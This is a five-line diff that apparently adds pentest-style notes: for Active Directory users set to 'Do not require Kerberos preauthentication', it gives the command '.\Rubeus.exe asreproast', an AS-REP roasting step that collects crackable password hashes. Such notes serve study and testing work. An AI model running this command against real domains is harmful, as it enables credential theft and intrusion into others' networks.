@@ -1,0 +1,5 @@
+for users set :
+
+Do not require Kerberos preauthentication
+
+.\Rubeus.exe asreproast
